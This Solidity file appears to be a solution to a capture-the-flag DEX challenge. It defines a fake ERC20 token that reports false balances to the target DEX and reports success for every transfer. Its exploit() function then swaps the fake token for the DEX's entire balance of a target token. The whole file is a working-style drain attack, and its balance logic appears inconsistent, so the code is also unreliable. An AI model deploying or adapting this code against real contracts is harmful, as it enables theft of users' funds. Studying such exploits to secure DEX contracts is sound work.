// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract BasicDexTwoExploit {
    // Token interface
    function balanceOf(address account) external view returns (uint256) {
        // Return any value the attacker wants
        if (msg.sender == dexTwo) {
            if (account == dexTwo) {
                // Return 1 for DEX's balance of our token
                return balanceToReturn;
            }
        }
        return 0;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        // Always succeed
        return true;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        // Always succeed
        return true;
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        // Always succeed
        return true;
    }
    
    address public dexTwo;
    uint256 public balanceToReturn = 1;
    address public owner;
    
    constructor(address _dexTwo) {
        dexTwo = _dexTwo;
        owner = msg.sender;
    }
    
    function setBalance(uint256 _balance) external {
        require(msg.sender == owner, "Only owner");
        balanceToReturn = _balance;
    }
    
    // Attack function
    function exploit(address tokenToDrain) external {
        require(msg.sender == owner, "Only owner");
        
        // Get current balance of target token in DEX
        (bool success, bytes memory data) = tokenToDrain.staticcall(
            abi.encodeWithSignature("balanceOf(address)", dexTwo)
        );
        require(success, "Failed to get balance");
        uint256 dexBalance = abi.decode(data, (uint256));
        
        if (dexBalance > 0) {
            // Call swap function on dexTwo
            // swap(from, to, amount)
            (bool swapSuccess,) = dexTwo.call(
                abi.encodeWithSignature(
                    "swap(address,address,uint256)",
                    address(this),  // from (our fake token)
                    tokenToDrain,   // to (target token)
                    dexBalance      // amount to swap
                )
            );
            require(swapSuccess, "Swap failed");
        }
    }
}